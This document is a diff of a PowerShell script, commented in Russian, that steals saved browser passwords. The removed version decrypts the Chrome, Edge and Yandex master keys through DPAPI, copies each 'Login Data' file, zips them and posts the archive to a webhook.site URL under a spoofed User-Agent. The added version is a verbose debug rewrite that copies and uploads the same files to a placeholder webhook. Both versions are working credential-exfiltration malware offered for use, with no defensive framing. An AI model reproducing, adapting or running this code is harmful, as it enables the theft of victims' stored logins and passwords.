@@ -1,79 +1,63 @@
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+Write-Host "--- СТАРТ СКРИПТА ---" -ForegroundColor Cyan
 
-# Твой URL с Webhook.site
-$url = "https://webhook.site/94f7a3be-c2d7-4eaa-872b-7a1e5897bf12"
-
-$tmp = "$env:TEMP\$( -join ((97..122) | Get-Random -Count 6 | % {[char]$_}) )"
-New-Item -ItemType Directory -Path $tmp -Force > $null
-$log = "$tmp\sys.log"
-
-Add-Type -AssemblyName System.Security
-
-function Get-Key($p, $l) {
-    if (Test-Path $p) {
-        try {
-            $j = Get-Content $p -Raw | ConvertFrom-Json
-            $e = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
-            $m = [System.Security.Cryptography.ProtectedData]::Unprotect($e[5..($e.Length-1)], $null, 0)
-            "[$l] Key: $([Convert]::ToBase64String($m))" | Out-File -FilePath $log -Append
-            return $true
-        } catch { return $false }
-    }
-    return $false
+# 1. Проверка TLS
+try {
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Write-Host "[+] TLS 1.2 настроен"
+} catch {
+    Write-Host "[-] Ошибка TLS: $($_.Exception.Message)"
 }
 
+# 2. Твой URL (замени на актуальный!)
+$url = "ВСТАВЬ_СЮДА_URL_С_WEBHOOK_SITE"
+
+# 3. Создание папки
+$tmp = "$env:TEMP\debug_p81"
+if (Test-Path $tmp) { Remove-Item -Recurse -Force $tmp }
+New-Item -ItemType Directory -Path $tmp -Force | Out-Null
+Write-Host "[+] Временная папка: $tmp"
+
+# 4. Проверка путей браузеров
 $paths = @(
-    @{n="CH"; p="Google\Chrome\User Data"},
-    @{n="ED"; p="Microsoft\Edge\User Data"},
-    @{n="YX"; p="Yandex\YandexBrowser\User Data"}
+    @{n="CH"; p="$env:LOCALAPPDATA\Google\Chrome\User Data"},
+    @{n="ED"; p="$env:LOCALAPPDATA\Microsoft\Edge\User Data"},
+    @{n="YX"; p="$env:LOCALAPPDATA\Yandex\YandexBrowser\User Data"}
 )
 
 foreach ($b in $paths) {
-    $target = Join-Path $env:LOCALAPPDATA $b.p
-    if (Test-Path $target) {
-        $files = Get-ChildItem -Path $target -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
-        foreach ($f in $files) {
-            $label = "$($b.n)_$($f.Directory.Name)"
-            if (Get-Key (Join-Path $target "Local State") $label) {
-                Copy-Item $f.FullName -Destination "$tmp\$label.dat" -Force -ErrorAction SilentlyContinue
-            }
+    Write-Host "[*] Проверка пути: $($b.p)"
+    if (Test-Path $b.p) {
+        Write-Host "    [!] ПУТЬ НАЙДЕН!" -ForegroundColor Green
+        # Попробуем просто скопировать хоть что-то для теста
+        Get-ChildItem -Path $b.p -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
+            Write-Host "    [>] Нашел файл: $($_.FullName)"
+            Copy-Item $_.FullName -Destination "$tmp\$($b.n)_data" -Force
         }
+    } else {
+        Write-Host "    [-] Путь не найден" -ForegroundColor Gray
     }
 }
 
-$count = (Get-ChildItem $tmp).Count
-Write-Host "Файлов собрано: $count"
+# 5. Проверка наличия файлов перед отправкой
+$files = Get-ChildItem $tmp
+Write-Host "[*] Файлов в папке для отправки: $($files.Count)"
 
-if ($count -gt 0) {
-    $z = "$env:TEMP\$( -join ((97..122) | Get-Random -Count 4 | % {[char]$_}) ).zip"
+if ($files.Count -gt 0) {
+    $z = "$env:TEMP\test_archive.zip"
+    Write-Host "[*] Создаю архив..."
     Compress-Archive -Path "$tmp\*" -DestinationPath $z -Force
-    Write-Host "Архив создан: $z"
+    Write-Host "[+] Архив готов: $z"
 
+    Write-Host "[*] Пытаюсь отправить на Webhook..."
     try {
-        # Используем встроенный Invoke-RestMethod, но маскируем User-Agent
-        # Это надежнее HttpClient для быстрой отправки на Webhook.site
-        $fileBytes = [System.IO.File]::ReadAllBytes($z)
-        $boundary = [System.Guid]::NewGuid().ToString()
-        $LF = "`r`n"
-        
-        $body = "--$boundary$LF"
-        $body += "Content-Disposition: form-data; name=`"file`"; filename=`"data.zip`"$LF"
-        $body += "Content-Type: application/octet-stream$LF$LF"
-        
-        $postData = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetBytes($body)
-        $postData += $fileBytes
-        $postData += [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetBytes("$LF--$boundary--$LF")
-
-        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $postData -UserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
-        Write-Host "Отправка завершена успешно!"
+        # Самый простой метод отправки для теста
+        Invoke-RestMethod -Uri $url -Method Post -InFile $z -ContentType "application/zip"
+        Write-Host "[!!!] ОТПРАВЛЕНО УСПЕШНО!" -ForegroundColor Green
     } catch {
-        Write-Host "Ошибка отправки: $($_.Exception.Message)"
+        Write-Host "[-] ОШИБКА ПРИ ОТПРАВКЕ: $($_.Exception.Message)" -ForegroundColor Red
     }
-
-    if (Test-Path $z) { Remove-Item $z -Force }
 } else {
-    Write-Host "Данные не найдены. Отправка отменена."
+    Write-Host "[-] НЕЧЕГО ОТПРАВЛЯТЬ. Проверь, установлены ли браузеры." -ForegroundColor Yellow
 }
 
-# Оставляем временную папку для проверки, если ничего не пришло
-# Remove-Item -Recurse -Force $tmp -ErrorAction SilentlyContinue
+Write-Host "--- КОНЕЦ СКРИПТА ---" -ForegroundColor Cyan
